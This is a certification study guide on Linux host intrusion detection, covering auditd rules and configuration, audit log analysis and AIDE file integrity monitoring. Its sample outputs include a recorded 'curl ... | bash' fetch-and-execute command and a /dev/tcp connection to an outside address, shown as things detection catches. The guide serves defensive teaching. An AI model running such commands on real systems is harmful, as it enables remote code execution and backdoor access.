# 332.2 — Host Intrusion Detection

**LPIC-3 Security (303-300, v3.0.0) · Topic 332 · Weight 8.33**

**Key knowledge areas:** Linux Audit subsystem (`auditd`), `chkrootkit`, `rkhunter` and its updates, Linux Malware Detect, automating host scans with cron/timers, AIDE and its rule management, OpenSCAP.

---

## 1. Motivation: the architectural problem in production

### 1.1 What a HIDS is actually for

Perimeter controls (firewall, WAF, network IDS) answer *"what crossed the boundary?"*. A Host Intrusion Detection System answers a fundamentally different and harder question: **"what happened on this machine, and is the machine still the machine I built?"**

The production driver is not paranoia — it is three measurable operational realities:

1. **Mean Time To Detect (MTTD).** Industry dwell time for host compromise is measured in weeks. Every hour of dwell time is another hour of lateral movement, credential harvesting and data staging. A HIDS is the only control that shortens MTTD *after* the initial access has already succeeded.
2. **Forensic reconstruction.** When an incident is declared, the first question the IR lead asks is "what did the process tree look like at 03:14?". If nothing recorded `execve`, the answer is "we don't know", and the incident becomes a rebuild-everything event instead of a scoped remediation.
3. **Evidence for controls that already exist on paper.** PCI DSS §10 (audit trails) and §11.5 (change-detection mechanism, explicitly a FIM), CIS Benchmarks, and DISA STIGs all require *demonstrable* logging and integrity monitoring. `auditd` + AIDE + OpenSCAP is the canonical Linux answer, and OpenSCAP is the tool that proves the other two are configured.

### 1.2 The failure mode this topic exists to prevent

Consider a realistic production incident on a Kubernetes worker node running a public-facing ingress:

```
t+0     RCE in a sidecar → shell as uid 1000 inside a container
t+3m    container escape via a hostPath mount → files written under /host/usr/local/sbin
t+11m   /etc/ssh/sshd_config modified: PermitRootLogin yes, Port 2222
t+12m   systemctl restart sshd
t+14m   LKM loaded, module hides PID range and TCP/2222 from netstat
t+2d    egress of 40 GB from a service account nobody audits
```

Map that against the detection families:

| Time | Event | Detected by | Detection latency |
|---|---|---|---|
| t+0 | RCE, shell spawn | syscall audit (`execve`), eBPF runtime | seconds |
| t+3m | write to `/usr/local/sbin` | audit watch (`-w /usr/local/sbin -p wa`), AIDE (next run) | seconds / hours |
| t+11m | `sshd_config` modified | audit watch + AIDE | seconds / hours |
| t+12m | daemon restart | audit `SERVICE_START`, journald | seconds |
| t+14m | LKM rootkit | audit `-w /sbin/insmod`, `chkrootkit`, `rkhunter` | seconds / next scan |
| t+2d | exfiltration | NIDS/flow — **not** a host control | — |

Two architectural conclusions fall straight out of that table, and they drive every design decision in this objective:

- **Syscall auditing is the only real-time layer.** Everything else is a periodic snapshot comparison. A daily AIDE run has an average detection latency of 12 hours and a worst case of 24.
- **Every one of these tools runs in the same namespace as the attacker.** Once root is obtained, the attacker can stop `auditd`, rewrite the AIDE database, and patch `chkrootkit`'s expected hashes. Therefore the design requirement is not "install the tools" but **"get the evidence off the box and make the baseline unforgeable"**.

### 1.3 The reference architecture

```
                       ┌────────────────────────────────────────────┐
   NODE (untrusted     │ kernel: audit context per task             │
   after compromise)   │   ├─ syscall filters (exit/task/user/excl.) │
                       │   ├─ fs watches (inode/dir)                 │
                       │   └─ kauditd ──► netlink(AUDIT) ──┐         │
                       │                                   ▼         │
                       │ userspace: auditd ──► plugin dispatcher     │
                       │       │                  ├─ af_unix (local) │
                       │       │                  ├─ syslog          │
                       │       ▼                  └─ au-remote ──────┼──► TLS/KRB5
                       │  /var/log/audit/audit.log (local, rotating) │      │
                       │                                            │      │
                       │ periodic: AIDE ─ rkhunter ─ chkrootkit ─    │      │
                       │           maldet ─ oscap                    │      │
                       └──────────┬─────────────────────────────────┘      │
                                  │ reports (fd/syslog)                    │
                                  ▼                                        ▼
                   ┌───────────────────────────────────────────────────────────┐
   TRUSTED PLANE   │  audit collector (auditd tcp_listen_port=60)              │
   (separate       │  SIEM / object store: ARF results, AIDE DBs (GPG-signed)  │
    trust domain)  │  alerting: rule-key → detection → ticket                  │
                   └───────────────────────────────────────────────────────────┘
```

**Non-negotiable properties:**

| Property | Implementation | Why |
|---|---|---|
| Evidence leaves the box in near-real-time | `au-remote` plugin, TCP/KRB5 to a collector | Log deletion on the host no longer destroys evidence |
| Baseline is not writable by the host | AIDE DB signed + copied to trusted plane; compare off-box | An attacker with root cannot silently `aide --update` |
| Rules cannot be unloaded | `-e 2` (immutable) in `audit.rules` | `auditctl -D` becomes a reboot, and a reboot is itself an alert |
| Scanners run from known-good binaries | package-manager verification, or scan from rescue media | `chkrootkit`/`rkhunter` are userspace and trivially subverted |
| Configuration drift is measured, not assumed | OpenSCAP profile eval on a timer, ARF archived | "auditd is configured" must be a query result, not a belief |

### 1.4 Honest scope: what none of these tools detect

State this to a security review before they discover it themselves:

- **Kernel-resident rootkits that hook the syscall table** defeat `auditd` (records never generated), `chkrootkit` (`ps`/`/proc` both lie consistently) and AIDE (`open()` returns the clean file). Countermeasures live one layer down: Secure Boot + module signature enforcement (`module.sig_enforce=1`), IMA/EVM appraisal, dm-verity/fs-verity for the root filesystem, and off-host memory acquisition.
- **Memory-only implants** touch no file, so a FIM is blind by construction.
- **Abuse of legitimate credentials** — an attacker with valid `sudo` produces perfectly ordinary audit records. Detection there is behavioural analytics on the shipped events, not the agent.

---

## 2. The Linux Audit subsystem

### 2.1 Internal mechanics

The audit subsystem is **kernel-resident**, not a userspace tracer. Each `task_struct` carries an `audit_context`. On syscall entry the kernel evaluates the *entry-side* filters cheaply; on syscall exit, if the context was marked auditable, it serialises a record set and enqueues it to a netlink socket (`NETLINK_AUDIT`) drained by `kauditd`, which hands it to the single userspace process that registered as the audit daemon (`auditd`, tracked by PID in the kernel).

Consequences that matter operationally:

- **Only one process may own the audit netlink socket.** If a vendor agent grabs it, `auditd` will fail with `Error sending status request (Operation not permitted)`. This is the single most common "auditd is installed but logs nothing" root cause.
- **Records are grouped into *events*** sharing a timestamp and a monotonically increasing serial: `msg=audit(1756049927.913:1043)`. A single `execve` produces `SYSCALL` + `EXECVE` + `CWD` + one `PATH` per path resolved + `PROCTITLE`. Reassembly is `ausearch`'s job — never `grep`.
- **The backlog queue is finite.** When the queue fills, behaviour depends on `--backlog_wait_time` and the failure mode (`-f`); events are dropped and the `lost` counter increases. Under a heavy rule set this is a real throughput ceiling, not a theoretical one.
- **Auditing is disabled during early boot unless `audit=1` is on the kernel command line.** Without it, everything before `auditd` starts is unrecorded — including initramfs and early `systemd` activity.

### 2.2 Filter lists and rule grammar

Five filter lists exist; three are usable in practice:

| List | Evaluated | Typical use |
|---|---|---|
| `task` | at `fork()`/`clone()` | Only `pid`/`uid`/`gid` fields are available. Rarely used. |
| `exit` | at syscall exit | **The workhorse.** Full field set, file paths resolved. |
| `user` | on userspace-originated messages | Filtering messages from PAM, `sudo`, etc. |
| `exclude` | before record creation | Suppress noise by `msgtype` — the cheapest noise control. |
| `filesystem` | at fs operations | Filter by filesystem type (e.g. exclude `tracefs`). |

Rule forms:

```bash
# 1. Syscall rule — the general form
-a always,exit -F arch=b64 -S execve,execveat -F auid>=1000 -F auid!=unset -k exec

# 2. Watch — syntactic sugar that expands into an exit,always rule
-w /etc/shadow -p wa -k identity
#   equivalent to: -a always,exit -F path=/etc/shadow -F perm=wa -k identity

# 3. Directory watch (recursive, inode-based, resolved at load time)
-w /etc/pam.d/ -p wa -k pam

# 4. Filesystem-tree rule (evaluated per access, follows new subdirectories)
-a always,exit -F dir=/etc/ssh -F perm=wa -k sshd_conf

# 5. Exclusion (must precede the rule it overrides — evaluation is first-match)
-a never,exit -F arch=b64 -S execve -F exe=/usr/lib/systemd/systemd-cgroups-agent
-a always,exclude -F msgtype=CWD
```

**Critical semantics people get wrong in production:**

- **Order matters, first match wins.** A `never` rule placed *after* the `always` rule it was meant to suppress does nothing. `augenrules` sorts `/etc/audit/rules.d/*.rules` **lexically by filename**, which is why the convention is `10-base.rules`, `30-syscalls.rules`, `99-finalize.rules`.
- **Always specify `arch=` for syscall rules on x86_64**, and specify both `b32` and `b64` if 32-bit binaries can run. Syscall numbers differ per ABI; a `b64`-only rule misses a 32-bit `execve` entirely.
- **`auid` (loginuid) is the accountability field**, set once per login session by `pam_loginuid` and immutable thereafter. `auid=unset` (`4294967295`) means "no login session" — i.e. a daemon. `-F auid!=unset` therefore means "actions attributable to a human".
- **`-w` on a directory resolves inodes at rule-load time.** Files created later inside it *are* caught (the watch is on the directory inode and its children), but a directory replaced wholesale (`mv /etc/foo /etc/foo.bak && mkdir /etc/foo`) silently orphans the watch. `-F dir=` does not have this problem — prefer it for volatile trees.
- **Deleting the key means losing the search index.** Every rule gets a `-k` key; `ausearch -k` and `aureport -k` are the only scalable retrieval paths.

### 2.3 Complete production rule set

`/etc/audit/rules.d/10-base.rules`:

```
## Reset: guarantee a deterministic state regardless of what was loaded before.
-D

## Kernel backlog. 8192 is the floor for a rule set this size on a busy node;
## 16384 for container hosts. Must be matched by audit_backlog_limit= on the
## kernel command line so early-boot events are not lost.
-b 16384

## Rate limit. 0 = unlimited. Any non-zero value silently drops evidence under
## load; prefer unlimited plus a monitored 'lost' counter.
-r 0

## Failure mode: 0 = silent, 1 = printk to dmesg, 2 = kernel panic.
## 1 is the production choice. 2 is for classified environments where losing an
## audit record is worse than losing the node — understand that before setting it.
-f 1

## Do not audit the audit daemon's own I/O, and drop the noisiest record types.
-a never,exit -F arch=b64 -F exe=/usr/sbin/auditd
-a always,exclude -F msgtype=CWD
-a always,exclude -F msgtype=CRYPTO_KEY_USER
```

`/etc/audit/rules.d/30-identity-and-config.rules`:

```
## ---- Account, group and authentication databases -------------------------
-w /etc/passwd            -p wa -k identity
-w /etc/shadow            -p wa -k identity
-w /etc/group             -p wa -k identity
-w /etc/gshadow           -p wa -k identity
-w /etc/security/opasswd  -p wa -k identity
-w /etc/sudoers           -p wa -k privilege_escalation
-w /etc/sudoers.d/        -p wa -k privilege_escalation

## ---- PAM, SSH, and remote access ----------------------------------------
-w /etc/pam.d/            -p wa -k pam
-w /etc/security/         -p wa -k pam
-a always,exit -F dir=/etc/ssh -F perm=wa -k sshd_config
-w /root/.ssh/            -p wa -k ssh_keys
-w /etc/ssh/sshd_config.d/ -p wa -k sshd_config

## ---- Time: clock manipulation destroys correlation across the fleet ------
-a always,exit -F arch=b64 -S adjtimex,settimeofday,clock_settime -k time_change
-a always,exit -F arch=b32 -S adjtimex,settimeofday,clock_settime,stime -k time_change
-w /etc/localtime -p wa -k time_change

## ---- Network configuration ----------------------------------------------
-a always,exit -F arch=b64 -S sethostname,setdomainname -k system_locale
-a always,exit -F arch=b32 -S sethostname,setdomainname -k system_locale
-w /etc/hosts        -p wa -k system_locale
-w /etc/resolv.conf  -p wa -k system_locale
-w /etc/nsswitch.conf -p wa -k system_locale

## ---- MAC policy ----------------------------------------------------------
-w /etc/selinux/     -p wa -k mac_policy
-w /etc/apparmor.d/  -p wa -k mac_policy

## ---- The detection stack must watch itself -------------------------------
-w /etc/audit/            -p wa -k audit_config
-w /var/lib/aide/         -p wa -k aide_db
-w /etc/aide.conf         -p wa -k aide_config
-w /etc/rkhunter.conf     -p wa -k rkhunter_config
-w /var/lib/rkhunter/db/  -p wa -k rkhunter_db
```

`/etc/audit/rules.d/40-execution.rules`:

```
## ---- Every command run by a human account -------------------------------
## The single highest-value rule in the file. Also the most expensive: budget
## roughly 1-3 KiB of log per exec. Measure before enabling fleet-wide.
-a always,exit -F arch=b64 -S execve,execveat -F auid>=1000 -F auid!=unset -k exec
-a always,exit -F arch=b32 -S execve,execveat -F auid>=1000 -F auid!=unset -k exec

## ---- Privilege escalation via setuid/setgid binaries --------------------
-a always,exit -F arch=b64 -C euid!=uid -F euid=0 -F auid>=1000 -F auid!=unset -S execve -k setuid_exec
-a always,exit -F arch=b32 -C euid!=uid -F euid=0 -F auid>=1000 -F auid!=unset -S execve -k setuid_exec

## ---- Kernel module lifecycle: the LKM-rootkit tripwire -------------------
-a always,exit -F arch=b64 -S init_module,finit_module,delete_module -k module_load
-a always,exit -F arch=b32 -S init_module,finit_module,delete_module -k module_load
-w /usr/bin/kmod   -p x -k module_load
-w /etc/modprobe.d/ -p wa -k module_config

## ---- Ptrace: process injection and credential theft from memory ---------
-a always,exit -F arch=b64 -S ptrace -F a0=4  -k code_injection   # PTRACE_POKETEXT
-a always,exit -F arch=b64 -S ptrace -F a0=5  -k code_injection   # PTRACE_POKEDATA
-a always,exit -F arch=b64 -S ptrace -F a0=6  -k code_injection   # PTRACE_POKEUSR
-a always,exit -F arch=b64 -S ptrace -F a0=16 -k tracing          # PTRACE_ATTACH

## ---- Discretionary access control changes -------------------------------
-a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F auid>=1000 -F auid!=unset -F success=1 -k perm_mod
-a always,exit -F arch=b64 -S chown,fchown,fchownat,lchown -F auid>=1000 -F auid!=unset -F success=1 -k perm_mod
-a always,exit -F arch=b64 -S setxattr,lsetxattr,fsetxattr,removexattr,lremovexattr,fremovexattr -F auid>=1000 -F auid!=unset -k perm_mod

## ---- Access denied: the classic recon signature -------------------------
-a always,exit -F arch=b64 -S open,openat,openat2,truncate,ftruncate -F exit=-EACCES -F auid>=1000 -F auid!=unset -k access_denied
-a always,exit -F arch=b64 -S open,openat,openat2,truncate,ftruncate -F exit=-EPERM  -F auid>=1000 -F auid!=unset -k access_denied

## ---- Persistence surfaces ------------------------------------------------
-w /etc/cron.d/       -p wa -k persistence
-w /etc/cron.daily/   -p wa -k persistence
-w /etc/crontab       -p wa -k persistence
-w /var/spool/cron/   -p wa -k persistence
-w /etc/systemd/system/ -p wa -k persistence
-w /usr/lib/systemd/system/ -p wa -k persistence
-w /etc/ld.so.preload -p wa -k persistence      # LD_PRELOAD rootkits
-w /etc/ld.so.conf.d/ -p wa -k persistence

## ---- Log tampering -------------------------------------------------------
-w /var/log/audit/    -p wa -k log_tampering
-w /var/log/lastlog   -p wa -k log_tampering
-w /var/run/utmp      -p wa -k session
-w /var/log/wtmp      -p wa -k session
-w /var/log/btmp      -p wa -k session
```

`/etc/audit/rules.d/99-finalize.rules`:

```
## Immutable. Any further auditctl change requires a reboot, and the reboot
## itself is an auditable, alertable event. MUST be lexically last.
-e 2
```

### 2.4 `auditd.conf` — the durability and self-protection contract

`/etc/audit/auditd.conf`:

```ini
local_events = yes
write_logs = yes
log_file = /var/log/audit/audit.log
log_group = adm
log_format = ENRICHED          # resolves uid/gid/syscall at write time — survives
                               # /etc/passwd changes and off-host analysis
flush = incremental_async      # durability/throughput trade-off; see table below
freq = 50
max_log_file = 64              # MiB
num_logs = 10                  # → 640 MiB local ring buffer
max_log_file_action = ROTATE
name_format = HOSTNAME         # stamp every record — mandatory when shipping
verify_email = no
action_mail_acct = sec-oncall@example.net

space_left = 15%
space_left_action = EMAIL
admin_space_left = 5%
admin_space_left_action = SINGLE
disk_full_action = SUSPEND
disk_error_action = SYSLOG

q_depth = 2000                 # dispatcher queue to plugins
overflow_action = SYSLOG
max_restarts = 10
plugin_dir = /etc/audit/plugins.d
end_of_event_timeout = 2
```

**`flush` trade-off:**

| Value | Semantics | Throughput | Evidence loss on hard power-off |
|---|---|---|---|
| `none` | Kernel page cache decides | Highest | Everything unwritten |
| `incremental` | `fflush()` every `freq` records | High | Up to `freq` records |
| `incremental_async` | Async flush every `freq` records | High | Up to `freq` records **(production default)** |
| `data` | `fdatasync()` per record | Low | Nothing (metadata may lag) |
| `sync` | `fsync()` per record | Lowest | Nothing |

**`*_action` risk table — read this before copying a STIG blindly:**

| Action | Effect | Production risk |
|---|---|---|
| `IGNORE` | Nothing | Silent evidence loss |
| `SYSLOG` | Message to syslog | Safe; requires syslog to still work |
| `EMAIL` | Mail + syslog | Safe; needs a working MTA (verify it) |
| `EXEC <path>` | Run a script | Powerful (page, expand LV, ship+truncate) |
| `SUSPEND` | Stop writing, keep running | Node stays up, evidence stops |
| `SINGLE` | Drop to single-user mode | **Node leaves the cluster** |
| `HALT` | Power off the node | **Node is gone.** A full audit partition becomes an outage |

A `disk_full_action = HALT` on a fleet with a shared log volume converts one filling filesystem into a correlated multi-node outage. Use `SUSPEND` plus a pager, mount `/var/log/audit` on its **own** logical volume, and monitor it as a first-class SLO.

### 2.5 Real-time forwarding to the trusted plane

`/etc/audit/plugins.d/au-remote.conf` (node):

```ini
active = yes
direction = out
path = /sbin/audisp-remote
type = always
format = string
```

`/etc/audit/audisp-remote.conf` (node):

```ini
remote_server = audit-collector.sec.example.net
port = 60
local_port = any
transport = KRB5
mode = immediate
queue_file = /var/spool/audit/remote.q
queue_depth = 20480
format = managed
network_retry_time = 1
max_tries_per_record = 3
max_time_per_record = 5
heartbeat_timeout = 30
overflow_action = syslog
disk_low_action = warn
disk_full_action = warn
disk_error_action = warn
remote_ending_action = reconnect
```

Collector-side `/etc/audit/auditd.conf` additions:

```ini
tcp_listen_port = 60
tcp_listen_queue = 128
tcp_max_per_addr = 4
tcp_client_max_idle = 60
use_libwrap = yes
distribute_network = no
name_format = HOSTNAME
krb5_principal = auditd
krb5_key_file = /etc/audit/audit.key
```

`transport = KRB5` gives mutual authentication and encryption. If Kerberos is not available, `transport = TCP` is plaintext — tunnel it (stunnel/WireGuard/IPsec) or the audit trail becomes a network-readable inventory of your privileged operations.

### 2.6 Operating the tools: real sessions

**Load rules and confirm kernel state:**

```
$ sudo augenrules --load
No rules
enabled 1
failure 1
pid 1284
rate_limit 0
backlog_limit 16384
lost 0
backlog 0
backlog_wait_time 60000
backlog_wait_time_actual 0

$ sudo auditctl -l | head -5
-a always,exit -F arch=b64 -S execve,execveat -F auid>=1000 -F auid!=-1 -F key=exec
-a always,exit -F arch=b32 -S execve,execveat -F auid>=1000 -F auid!=-1 -F key=exec
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k privilege_escalation

$ sudo auditctl -s
enabled 2
failure 1
pid 1284
rate_limit 0
backlog_limit 16384
lost 0
backlog 3
backlog_wait_time 60000
backlog_wait_time_actual 0
```

`enabled 2` confirms immutable mode. From here `auditctl -D` returns `Error deleting rule (Operation not permitted)` and rule changes require a reboot — exactly the intent.

**Retrieve an event by key, interpreted:**

```
$ sudo ausearch -k identity -i -ts today
----
type=PROCTITLE msg=audit(08/24/2026 03:58:11.402:8871) : proctitle=vipw
type=PATH msg=audit(08/24/2026 03:58:11.402:8871) : item=1 name=/etc/passwd inode=134321 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:passwd_file_t:s0 nametype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0
type=PATH msg=audit(08/24/2026 03:58:11.402:8871) : item=0 name=/etc/ inode=134177 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:etc_t:s0 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0
type=CWD msg=audit(08/24/2026 03:58:11.402:8871) : cwd=/root
type=SYSCALL msg=audit(08/24/2026 03:58:11.402:8871) : arch=x86_64 syscall=rename success=yes exit=0 a0=0x55a4c1e2b2c0 a1=0x55a4c1e2b300 a2=0x0 a3=0x0 items=4 ppid=24801 pid=24853 auid=sre-oncall uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=41 comm=vipw exe=/usr/sbin/vipw subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=identity
```

Read it as a chain of custody: `auid=sre-oncall` is the accountable human, `ses=41` ties it to a login session, `uid=root` is the effective privilege, `exe`/`comm` is the tool, and `nametype=DELETE`+`rename` shows an atomic replace of `/etc/passwd`.

**Correlate the login session that produced it:**

```
$ sudo ausearch --session 41 -m USER_LOGIN,USER_START,USER_END -i
----
type=USER_LOGIN msg=audit(08/24/2026 03:57:02.118:8840) : pid=24799 uid=root auid=sre-oncall ses=41 subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 msg='op=login id=sre-oncall exe=/usr/sbin/sshd hostname=10.42.7.19 addr=10.42.7.19 terminal=/dev/pts/0 res=success'
```

**Fleet-level summaries:**

```
$ sudo aureport --summary -i

Summary Report
======================
Range of time in logs: 08/17/2026 03:10:01.001 - 08/24/2026 11:58:22.417
Selected time for report: 08/17/2026 03:10:01 - 08/24/2026 11:58:22.417
Number of changes in configuration: 214
Number of changes to accounts, groups, or roles: 6
Number of logins: 43
Number of failed logins: 118
Number of authentications: 209
Number of failed authentications: 121
Number of users: 7
Number of terminals: 12
Number of host names: 9
Number of executables: 41
Number of files: 1176
Number of AVC's: 3
Number of failed syscalls: 3391
Number of anomaly events: 1
Number of keys: 19
Number of events: 46022

$ sudo aureport -k --summary -i | head -12
Key Summary Report
===========================
total  key
===========================
21883  exec
1044   access_denied
612    identity
188    perm_mod
77     persistence
41     privilege_escalation
12     module_load
3      log_tampering
1      code_injection

$ sudo aureport -au --summary -i --failed | head
Failed Authentication Summary Report
============================================
total  acct
============================================
94     root
17     oracle
6      admin
4      test
```

Four failed authentications for an account named `test` on a production node is not noise — it is a credential-spray probe that succeeded in enumerating your username policy.

**`autrace` — targeted syscall tracing of a single binary:**

`autrace` is `strace`'s audited cousin: it runs a program with a temporary "audit everything this PID does" rule set. It **requires that no other rules be loaded**, so it is a lab/triage tool, not a production one.

```
$ sudo auditctl -D
No rules
$ sudo autrace /usr/local/sbin/suspicious-helper
Waiting to execute: /usr/local/sbin/suspicious-helper
Cleaning up...
Trace complete. You can locate the records with 'ausearch -i -p 26144'

$ sudo ausearch -i -p 26144 --raw | aureport -f -i --summary

File Summary Report
===========================
total  file
===========================
7      /etc/ld.so.cache
3      /tmp/.ICE-unix/.x0
2      /etc/shadow
1      /dev/tcp/198.51.100.44/9001
```

Then restore production rules: `sudo augenrules --load`.

**TTY auditing (root keystroke capture):**

`/etc/pam.d/system-auth` (or `common-session` on Debian):

```
session required pam_tty_audit.so disable=* enable=root log_passwd
```

```
$ sudo aureport --tty -i | head
TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 08/24/2026 04:02:19 8890 sre-oncall 1 41 bash "curl -s http://198.51.100.44/x.sh | bash",<ret>
```

Note the privacy trade-off: `log_passwd` records password keystrokes typed on the TTY. Some jurisdictions and works councils forbid it; the audit trail itself becomes a secret of the highest sensitivity. Default to omitting `log_passwd` unless the requirement is explicit.

### 2.7 auditd vs the alternatives

| Dimension | `auditd` (kernel audit) | eBPF (Falco / Tetragon / Tracee) | `fanotify` FIM | Runtime `LD_PRELOAD` shims |
|---|---|---|---|---|
| Kernel support | Everywhere since 2.6 | ≥ 4.18 realistically, ≥ 5.8 for CO-RE | ≥ 5.1 for `FAN_REPORT_FID` | Any |
| Namespace / container awareness | Partial (`contid` in audit 3.x, patchy) | Native, first-class | Partial | None |
| Overhead under heavy `execve` | 5–15 % on syscall-heavy workloads | 1–5 % | Low | High |
| Evasion by root | Stop daemon, `-e 2` mitigates | Unload probe | Same | Trivial |
| Certification/compliance acceptance | **Universal** (STIG/CIS/PCI cite it by name) | Growing, not yet a named control | Rare | No |
| Filtering expressiveness | Fixed field grammar | Turing-complete in the probe | Path-based | N/A |
| Exam scope (303-300) | **Yes** | No | No | No |

Design conclusion for a mixed fleet: run **both**. `auditd` is the compliance-grade, node-level, immutable record. eBPF tooling is the container-aware, low-latency behavioural layer. They are complements, and the failure mode of running only eBPF is that an auditor asks for the STIG control and you have nothing to show.

---

## 3. File integrity monitoring with AIDE

### 3.1 Mechanics and the baseline-trust problem

AIDE (Advanced Intrusion Detection Environment) walks a configured selection of the filesystem, records per-file attributes and cryptographic digests into a database, and later re-walks and diffs. Everything interesting is in three design choices:

1. **Which attributes**, because hashing everything on a 400 GB volume is a several-hour I/O storm and hashing nothing catches nothing.
2. **Where the database lives**, because a database writable by the compromised host is a database the attacker updates.
3. **How change is triaged**, because a package update legitimately changes 4 000 files and an unmanaged FIM produces alert fatigue within one week.

### 3.2 Attribute groups

| Symbol | Attribute | Detects |
|---|---|---|
| `p` | permissions | `chmod 4755` on a dropped binary |
| `i` | inode | file replaced rather than edited |
| `n` | link count | hard-link staging |
| `u` / `g` | owner / group | ownership hijack |
| `s` | size | content change (weak alone) |
| `S` | size may grow only | log files (shrinking = truncation = tampering) |
| `b` | block count | sparse-file tricks |
| `m` | mtime | change time (attacker-settable via `touch`) |
| `c` | ctime | inode change time (**not** settable without clock manipulation) |
| `a` | atime | access (noisy; disables most caching benefits) |
| `acl`, `selinux`, `xattrs` | extended metadata | capability-based backdoors (`cap_setuid+ep`) |
| `ftype` | file type | regular file swapped for a FIFO/symlink |
| `sha256`, `sha512`, `md5`, `rmd160` | digests | actual content change |
| `l` | link name | symlink retarget |
| `I` | ignore changed filename | for rotating names |

Composite built-ins: `R` (read-only files: `p+ftype+i+l+n+u+g+s+m+c+acl+selinux+xattrs+md5`), `L` (metadata only, no digest), `>` (growing log file), `E` (empty group), `H` (all compiled-in hashes).

Attacker-relevant point: `mtime` is trivially forged with `touch -r`, `ctime` is not (short of `settimeofday`, which your audit rules catch). **Always include `c` and at least one SHA-2 digest.**

### 3.3 Complete `/etc/aide.conf`

```
# =====================================================================
#  AIDE configuration — production baseline
#  Database is written locally, then signed and shipped off-host.
# =====================================================================

@@define DBDIR   /var/lib/aide
@@define LOGDIR  /var/log/aide

database_in  = file:@@{DBDIR}/aide.db.gz
database_out = file:@@{DBDIR}/aide.db.new.gz
database_new = file:@@{DBDIR}/aide.db.new.gz
gzip_dbout   = yes

# Report to stdout (captured by the systemd unit) and duplicated to syslog so
# the SIEM sees it even if the local report file is deleted.
report_url = file:@@{LOGDIR}/aide-check.log
report_url = stdout
report_url = syslog:LOG_AUTH

log_level      = warning
report_level   = changed_attributes
report_summarize_changes = yes
report_grouped = yes

# Attributes actually stored. Adding an attribute here without re-initialising
# the database yields "attribute not present in database" for every entry.
database_attrs = sha512

# ---------------------------------------------------------------------
# Rule definitions
# ---------------------------------------------------------------------
# Immutable binaries and libraries: full content + metadata.
BIN        = p+i+n+u+g+s+b+c+m+sha512+ftype+acl+selinux+xattrs

# Configuration: content matters, atime does not.
CONF       = p+i+n+u+g+s+c+m+sha512+ftype+acl+selinux+xattrs

# Metadata only — for large data trees where hashing is unaffordable.
META       = p+i+n+u+g+ftype+acl+selinux+xattrs

# Log files: may grow, may not shrink or change owner.
LOGS       = p+u+g+i+n+S+acl+selinux+xattrs

# Directories: watch permissions and ownership, not the mtime churn.
DIR        = p+i+n+u+g+acl+selinux+xattrs+ftype

# Presence only.
EXISTS     = p+ftype

# ---------------------------------------------------------------------
# Selection lines. Order is irrelevant; the LONGEST matching path wins.
#   /path RULE   → recursive include
#   =/path RULE  → this directory only, not its children
#   !/path       → recursive exclude
# ---------------------------------------------------------------------

# --- Executables and libraries ---------------------------------------
/usr/bin        BIN
/usr/sbin       BIN
/usr/lib        BIN
/usr/lib64      BIN
/usr/libexec    BIN
/usr/local/bin  BIN
/usr/local/sbin BIN
/usr/local/lib  BIN
/boot           BIN

# --- Configuration ----------------------------------------------------
/etc            CONF
=/etc/mtab      EXISTS
!/etc/mtab$
!/etc/.*\.swp$
!/etc/adjtime$
!/etc/lvm/archive
!/etc/lvm/backup
!/etc/resolv\.conf$          # DHCP/NetworkManager churn: audit watch covers it
!/etc/machine-id$

# --- The detection stack itself --------------------------------------
/etc/audit      CONF
/etc/aide.conf  CONF
/var/lib/rkhunter/db  CONF

# --- Persistence surfaces --------------------------------------------
/etc/cron.d        CONF
/etc/cron.daily    CONF
/etc/cron.hourly   CONF
/etc/cron.weekly   CONF
/etc/cron.monthly  CONF
/var/spool/cron    CONF
/etc/systemd/system      CONF
/usr/lib/systemd/system  CONF
/root/.ssh         CONF

# --- Kernel modules ---------------------------------------------------
/usr/lib/modules   BIN

# --- Logs: append-only semantics -------------------------------------
/var/log           LOGS
!/var/log/journal
!/var/log/audit             # auditd owns this; AIDE would alert every run

# --- Home directories: presence and permissions only ------------------
/home              DIR
!/home/.*/\..*                # dotfiles change constantly

# --- Explicit exclusions: pseudo-filesystems and volatile state -------
!/dev
!/proc
!/sys
!/run
!/tmp
!/var/tmp
!/var/cache
!/var/lib/docker
!/var/lib/containerd
!/var/lib/kubelet
!/var/lib/containers
!/var/spool/postfix
!/var/lib/systemd
!/var/lib/NetworkManager
!/var/lib/chrony
!/swapfile
```

**Debian/Ubuntu note:** the config is assembled from `/etc/aide/aide.conf.d/` by `update-aide.conf` into `/var/lib/aide/aide.conf.autogenerated`; drive it via `aideinit` and `aide.wrapper --check` rather than editing a monolithic file. RHEL/Fedora/SUSE use the single `/etc/aide.conf` shown above.

### 3.4 Lifecycle

```
$ sudo aide --config-check
$ sudo aide --init
Start timestamp: 2026-08-24 04:00:07 -0300 (AIDE 0.18.6)
AIDE initialized database at /var/lib/aide/aide.db.new.gz

Number of entries:	68940

---------------------------------------------------
The attributes of the (uncompressed) database(s):
---------------------------------------------------
/var/lib/aide/aide.db.new.gz
  SHA512   : DTr+9dQKMWKzTe6Kk8lKdEG9RfLB0aeY
             qXyR1UbHkVvA6qPq7c3Y0hZ4mE0nGZ1t
             PVMdBqQ0Vv2fQ2Yy5nEZ3g==

End timestamp: 2026-08-24 04:03:52 -0300 (run time: 3m 45s)

$ sudo mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz
```

Then **get the baseline out of the attacker's reach**:

```
$ sudo gpg --detach-sign --armor --local-user fim-baseline@example.net \
       /var/lib/aide/aide.db.gz
$ sudo sha512sum /var/lib/aide/aide.db.gz | sudo tee /var/lib/aide/aide.db.gz.sha512
c41f9e0d2b... /var/lib/aide/aide.db.gz
$ sudo aws s3 cp /var/lib/aide/aide.db.gz     s3://fim-baselines/$(hostname -f)/ --sse aws:kms
$ sudo aws s3 cp /var/lib/aide/aide.db.gz.asc s3://fim-baselines/$(hostname -f)/ --sse aws:kms
$ sudo chattr +i /var/lib/aide/aide.db.gz
```

